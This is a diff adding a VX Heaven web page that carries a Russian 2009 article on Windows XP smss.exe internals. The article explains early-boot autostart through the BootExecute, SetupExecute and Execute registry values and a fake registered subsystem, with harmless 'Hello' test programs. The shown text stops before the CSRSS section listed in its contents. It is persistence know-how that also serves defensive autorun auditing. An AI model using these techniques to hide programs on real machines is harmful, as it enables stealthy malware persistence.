@@ -1,0 +1,346 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> FreeMan 'Авторан на халяву' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="FreeMan"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, FreeMan,Авторан на халяву, ntstatus, smss, dword, подсистемы, smapiport, ntsysapi, ntapi, csrss, optional, session, include, basesrv, string, параметра, required"/>
+<meta name="Description" content="Данная статья - результат небольшого исследования smss и сsrss ОС Windows XP SP2. В ходе него было обнаружено несколько возможностей автозагрузки. Все эти техники, пожалуй, уже встречались в том или ином виде в &quot;дикой природе&quot;, или, как говорится, itw. Все изложенные методы интересны тем, что запуск происходит на ранних этапах загрузки системы, а удаление исполняемых файлов без соответствующей правки реестра порой приводит к невозможности повторной загрузки ОС (поэтому рекомендую все действия выполнять на виртуальной машине). Начнем снизу, то есть с smss."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"1bf9599303ee08806ae6548cad4bf66e353ca231-1498757819-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vfr00.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Авторан на халяву</h1><p><a href="/lib/?lang=ru&amp;author=FreeMan"> FreeMan</a><br/> <em>Декабрь 2009</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vfr00.html';</script><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/%D0%90%D0%B2%D1%82%D0%BE%D1%80%D0%B0%D0%BD%20%D0%BD%D0%B0%20%D1%85%D0%B0%D0%BB%D1%8F%D0%B2%D1%83.pdf">Скачать</a> PDF (236.7Kb) (Вы должны быть зарегистрированы на <a href="/forum">форуме</a>)<br/>[<a style="" href="/lib/?lang=RU&amp;index=WI#vfr00">Вернуться к списку</a>] [<a href="/lib/vfr00.html#disqus_thread">Комментарии</a>]<br/> 
+<ul>
+<li><a href="#c1">Введение</a></li>
+<li><a href="#c2">Введение в SMSS</a></li>
+<li><a href="#c3">Загрузка через BootExecute SetupExecute.</a></li>
+<li><a href="#c4">Загрузка через Execute.</a></li>
+<li><a href="#c5">SmpExecuteInitialCommand на исполнение.</a></li>
+<li><a href="#c6">Автозагрузка добавлением в список подсистем.</a></li>
+<li><a href="#c7">CSRSS и автозапуск</a></li>
+</ul>
+<h2><a name="c1"></a>Введение</h2>
+<p>Данная статья - результат небольшого исследования <strong>smss</strong> и <strong>сsrss</strong> ОС Windows XP SP2. В ходе него было обнаружено несколько возможностей автозагрузки. Все эти техники, пожалуй, уже встречались в том или ином виде в "дикой природе", или, как говорится, itw. Все изложенные методы интересны тем, что запуск происходит на ранних этапах загрузки системы, а удаление исполняемых файлов без соответствующей правки реестра порой приводит к невозможности повторной загрузки ОС (поэтому рекомендую все действия выполнять на виртуальной машине). Начнем снизу, то есть с <strong>smss</strong>.</p>
+<h2><a name="c2"></a>Введение в SMSS</h2>
+<p>SMSS (Session Manager Subsystem Service) - компонент Windows, который отвечает за управление сессиями, как видно из названия, а также производит жизненно необходимые действия на начальных этапах. Довольно поверхностно работа smss, как и csrss, рассмотрена в известной всем книге «Внутреннее устройство Microsoft Windows 2000».</p>
+<p>С запуском smss.exe (в ntos!Phase1Initialization) связанно 3 BSOD’a: SESSION3_INITIALIZATION_FAILED, SESSION4_INITIALIZATION_FAILED, SESSION5_INITIALIZATION_FAILED. Это наталкивает на мысль, что это довольно ценный компонент системы. Рассмотрим его работу более детально.</p>
+<p>Практически сразу после запуска управление получает <strong>smss!SmpInit</strong>, где создается порт \SmApiPort и пара потоков <strong>smss!SmpApiLoop</strong>, которые его обслуживают. Тут, кстати, авторы умной книги немного преувеличивают, утверждая «… и два потока, ожидающие клиентские запросы (например, на загрузку новой подсистемы или на создание сеанса)». На самом деле, никаких новых подсистем smss не загружает, есть лишь сообщение <strong>SmLoadDeferedSubsystemApi</strong>, получение которого приводит к подгрузке подсистем, которые содержатся в списке <strong>smss!SmpSubSystemsToDefer</strong>. Данный список, как и другие не менее интересные списки, заполняется в результате вызова обработчика, указанного в таблице <strong>smss!SmpRegistryConfigurationTable</strong>, которая передается в <strong>RtlQueryRegistryValues</strong>. Рассмотрим ключи, имена которых встречаются в данной таблице.</p>
+<ol>
+<li><strong>ProtectionMode</strong>. Влияет на установку прав доступа к \SmApiPort’у;</li>
+<li><strong>AllowProtectedRenames</strong>. Если установлен, то разрешает отложенное перемещение файлов, защищенных WFP;</li>
+<li><strong>ObjectDirectories</strong>. Приводит к созданию каталогов (<strong>NtCreateDirectoryObject</strong>) c указанными именами;</li>
+<li><strong>BootExecute</strong>. Указание приложения в этом ключе приводит к его запуску. Autoruns выводит список приложений, указанных в этом ключе. Широко известный и используемый ключ, используемый для запуска Native приложений. При указании имени Native-приложения, которое необходимо загрузить, кроме идентификатора <strong>autocheck</strong> (используется при указании autochk в этом списке) возможны идентификаторы <strong>async</strong> (приводит к тому, что система не ожидает завершения запускаемого процесса) и <strong>debug</strong> (приводит к установке <strong>ProcessParameters->DebugFlags = TRUE</strong>). http://technet.microsoft.com/en-us/sysinternals/bb897447.aspx - кадр из Microsoft немного пишет по теме;</li>
+<li><strong>SetupExecutе</strong>. Аналогичный BootExecute, только приложения вызываются после вызова <strong>NtInitializeRegistry</strong>. А также при получении сообщения <strong>SmStartCsr</strong>;</li>
+<li><strong>PendingFileRenameOperations, PendingFileRenameOperations2</strong>. Содержат информацию о файлах, которые должны быть переименованы после перезагрузки системы;</li>
+<li><strong>PagingFiles, DOS Devices, ExcludeFromKnownDlls, KnownDlls, Environment</strong>. Неинтересные в контексте данной статьи ключи, назначение которых интуитивно понятно;</li>
+<li><strong>Subsystems, Require, Optional, KMode</strong>. Отвечают за запуск подсистем и будут рассмотрены более детально ниже;</li>
+<li><strong>Execute</strong>. Позволяет запустить приложения. Более подробно будет рассмотрен ниже.</li>
+</ol>
+<p>Данный список может варьироваться от системы к системе, хоть различия и не значительны. Теперь рассмотрим способы автозагрузки исходя из полученной информации.</p>
+<h2><a name="c3"></a>Загрузка через BootExecute SetupExecute.</h2>
+<p>Создадим тестовое Native приложение, которое будет выводить строку на экран приветствия с помощью <strong>NtDisplayString</strong>.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#pragma comment(linker,&quot;/ENTRY:NtProcessStartup&quot;)</span><br/>
+<span style="color: #339933;">#define _X86_</span><br/>
+<span style="color: #339933;">#include &lt;ntddk.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;windef.h&gt;</span><br/>
+<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #ff0000;">&quot;C&quot;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSYSAPI NTSTATUS NTAPI NtDisplayString<span style="color: black;">&#40;</span>IN PUNICODE_STRING String <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSYSAPI NTSTATUS NTAPI NtTerminateProcess<span style="color: black;">&#40;</span>IN HANDLE ProcessHandle OPTIONAL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN NTSTATUS ExitStatus<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">void</span> APIENTRY NtProcessStartup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; UNICODE_STRING usMess<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; RtlInitUnicodeString<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>usMess<span style="color: #339933;">,</span>L<span style="color: #ff0000;">&quot;Hello, im pretty fine dummy native application<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NtDisplayString<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>usMess<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NtTerminateProcess<span style="color: black;">&#40;</span>NtCurrentProcess<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Полученный файл скопируем в директорию system32. В реестре в разделе Session Manager редактируем/создаем параметр <em>BootExecute/SetupExecute</em> типа <em>REG_MULTI_SZ</em>, содержащий строку <strong>native</strong>, где <strong>native</strong> – имя программы. После чего производим перезагрузку, наблюдая при загрузке картину типа этой:</p>
+<div align="center">
+<img src="img/vfr00_fig1.jpg" alt=""/>
+</div>
+<h2><a name="c4"></a>Загрузка через Execute.</h2>
+<p>Принцип загрузки с помощью этого ключа похож на принцип, используемый при загрузке с помощью BootExecute. Но есть и нюанс. Прежде чем запустить все приложения, которые присутствуют в списке, исполняется следующий код:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">v10 <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>SmpExecuteList<span style="color: #339933;">;</span><br/>
+<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> SmpExecuteList <span style="color: #339933;">==</span> <span style="color: black;">&#40;</span>_DWORD<span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>SmpExecuteList <span style="color: black;">&#41;</span><span style="color: black; font-style: italic;">//проверка пуст ли список</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; RtlInitUnicodeString<span style="color: black;">&#40;</span>usIC<span style="color: #339933;">,</span> L<span style="color: #ff0000;">&quot;winlogon.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; InitialCommandBuffer <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LdrQueryImageFileExecutionOptions<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">int</span><span style="color: black;">&#41;</span>usIC<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">int</span><span style="color: black;">&#41;</span>L<span style="color: #ff0000;">&quot;Debugger&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>InitialCommandBuffer<span style="color: #339933;">,</span> <span style="color: #0000dd;">512</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> InitialCommandBuffer <span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _wcscat<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>InitialCommandBuffer<span style="color: #339933;">,</span> L<span style="color: #ff0000;">&quot; &quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _wcscat<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>InitialCommandBuffer<span style="color: #339933;">,</span> usIC<span style="color: #339933;">-&gt;</span>Buffer<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RtlInitUnicodeString<span style="color: black;">&#40;</span>usIC<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>InitialCommandBuffer<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v10 <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>SmpExecuteList<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<span style="color: #b1b100;">else</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; v14 <span style="color: #339933;">=</span> smpexecOfs<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; v15 <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span>_DWORD <span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>smpexecOfs<span style="color: #339933;">-&gt;</span>usStr.<span style="color: #202020;">Length</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DestinationString.<span style="color: #202020;">HighPart</span> <span style="color: #339933;">=</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span><span style="color: black;">&#40;</span>_DWORD <span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>usIC<span style="color: #339933;">-&gt;</span>Length <span style="color: #339933;">=</span> v15<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; usIC<span style="color: #339933;">-&gt;</span>Buffer <span style="color: #339933;">=</span> v14<span style="color: #339933;">-&gt;</span>usStr.<span style="color: #202020;">Buffer</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DestinationString.<span style="color: #202020;">LowPart</span> <span style="color: #339933;">=</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">50000000</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NtDelayExecution<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>DestinationString<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Тобишь присутствует некая структура UNICODE_STRING, указатель на которую передаётся из <strong>smss!_main</strong> в <strong>smss!SmpInit -> smss!SmpLoadDataFromRegistry -> smss! SmpLoadSubSystemsForMuSession</strong>. Эта структура заполняется на данном участке кода и команда, которая записана туда после возврата из <strong>smss!SmpInit</strong> будете передана в <strong>smss</strong>!</p>
+<h2><a name="c5"></a>SmpExecuteInitialCommand на исполнение.</h2>
+<p>В случае отсутствия <strong>Execute</strong> параметра эта строка будет содержать <em>«winlogon.exe»</em> либо, если присутствует параметр Debugger в ключе реестра <em>HKLM\Software\Microsoft\Windows NT\Current Version\Image File Execution Options\winlogon.exe</em>, то строка <em>«winlogon.exe»</em> будет присоединена к значению этого параметра.</p>
+<p>В случае присутствия <strong>Execute</strong> строка будет инициализирована последним элементом, указанным в данном параметре. После чего будет выполнена 5 секундная задержка, связанная с выполнением <strong>csr</strong>. Также не будет давать желаемого результата вызов <strong>NtDisplayString</strong>, т.к. на момент прохода списка подсистемы уже запущены. Поэтому немного переделаем тестовый пример:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> APIENTRY NtProcessStartup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DbgPrint<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Hello<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>А значение параметра <strong>Execute</strong> установим:</p>
+<ul style="list-style: none;">
+<li><em>async native.exe</em></li>
+<li><em>winlogon.exe</em></li>
+</ul>
+<p>Идентификатор <strong>async</strong> необходим для того, чтоб система не ожидала завершения приложения, которое не рассчитано на то, чтобы завершиться.</p>
+<h2><a name="c6"></a>Автозагрузка добавлением в список подсистем.</h2>
+<p>Перейдем к сабкею <strong>SubSystems</strong>.</p>
+<p>Здесь все предельно ясно. Есть два параметра – <strong>Required</strong> и <strong>Optional</strong>. В них содержаться имена подсистем, которые необходимо запустить. Разница между <strong>Required</strong> и <strong>Optional</strong> в том, что подсистемы, попадающие во второй список, запускаются по запросу, а не сразу. Поэтому будем использовать параметр <strong>Required</strong> для добавления своей «подсистемы».</p>
+<p>После добавления имени подсистемы необходимо создать параметр с именем, которое совпадает с именем «подсистемы» и значением, которое содержит имя сервера подсистемы. Но, даже проделав данные операции с реестром, максимум, чего мы добьемся – стабильное зависание на этапе загрузки подсистем. Это связано с тем, что в отличие от старта из вышеописанных ключей, для запуска подсистем используется не <strong>smss!SmpExecuteImage</strong>, а <strong>smss!SmpLoadSubSystem</strong>, которая также вызывает <strong>smss!SmpExecuteImage</strong> но кроме того добавляет в список подсистем информацию о нашей подсистеме. Также запись о подсистеме содержит описатель события, на котором ожидает smss после запуска подсистемы. Событие переводится в сигнальное состояния после того, как подсистема произведет свою инициализацию и сообщит об этом коннектом на порт <strong>\SmApiPort</strong>.</p>
+<p>Новый исходный код тестового приложения:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#pragma comment(linker,&quot;/ENTRY:NtProcessStartup&quot;)</span><br/>
+<span style="color: #339933;">#define _X86_</span><br/>
+<span style="color: #339933;">#include &lt;ntddk.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;windef.h&gt;</span><br/>
+<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #ff0000;">&quot;C&quot;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSYSAPI NTSTATUS NTAPI NtDisplayString<span style="color: black;">&#40;</span>IN PUNICODE_STRING String <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSYSAPI NTSTATUS NTAPI NtTerminateProcess<span style="color: black;">&#40;</span>IN HANDLE ProcessHandle OPTIONAL<span style="color: #339933;">,</span>IN<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS ExitStatus<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSYSAPI NTSTATUS NTAPI NtConnectPort<span style="color: black;">&#40;</span>OUT PHANDLE ClientPortHandle<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN PUNICODE_STRING ServerPortName<span style="color: #339933;">,</span> IN PSECURITY_QUALITY_OF_SERVICE<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SecurityQos<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN OUT <span style="color: #808080; font-style: italic;">/*PLPC_SECTION_OWNER_MEMORY*/</span> PVOID ClientSharedMemory OPTIONAL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OUT <span style="color: #808080; font-style: italic;">/*PLPC_SECTION_MEMORY*/</span> PVOID ServerSharedMemory OPTIONAL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OUT PULONG MaximumMessageLength OPTIONAL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN OUT PVOID ConnectionInfo OPTIONAL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN OUT PULONG ConnectionInfoLength OPTIONAL <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _SBCONNECTINFO <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG SubsystemImageType<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; WCHAR EmulationSubSystemPortName<span style="color: black;">&#91;</span><span style="color: #0000dd;">120</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span> SBCONNECTINFO<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PSBCONNECTINFO<span style="color: #339933;">;</span><br/>
+<span style="color: #339933;">#define OUR_SUBSYSTEM_TYPE 0x0DEAD</span><br/>
+NTSTATUS ConnectToSmss<span style="color: black;">&#40;</span>OUT PHANDLE SmApiPort <span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS st<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; UNICODE_STRING PortName<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ConnectInfoLength<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SBCONNECTINFO ConnectInfo<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SECURITY_QUALITY_OF_SERVICE DynamicQos <span style="color: #339933;">=</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>DynamicQos<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> SecurityImpersonation<span style="color: #339933;">,</span> SECURITY_DYNAMIC_TRACKING<span style="color: #339933;">,</span> TRUE<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; RtlInitUnicodeString<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>PortName<span style="color: #339933;">,</span>L<span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\\</span>SmApiPort&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ConnectInfoLength <span style="color: #339933;">=</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>SBCONNECTINFO<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ConnectInfo.<span style="color: #202020;">SubsystemImageType</span> <span style="color: #339933;">=</span> OUR_SUBSYSTEM_TYPE<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; st <span style="color: #339933;">=</span> NtConnectPort<span style="color: black;">&#40;</span>SmApiPort<span style="color: #339933;">,&amp;</span>PortName<span style="color: #339933;">,&amp;</span>DynamicQos<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>PVOID<span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>ConnectInfo<span style="color: #339933;">,&amp;</span>Connect<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; InfoLength<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> st<span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<span style="color: #993333;">void</span> APIENTRY NtProcessStartup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; HANDLE SmApiPort<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ConnectToSmss<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>SmApiPort<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DbgPrint<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Hello<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NtTerminateProcess<span style="color: black;">&#40;</span>NtCurrentProcess<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
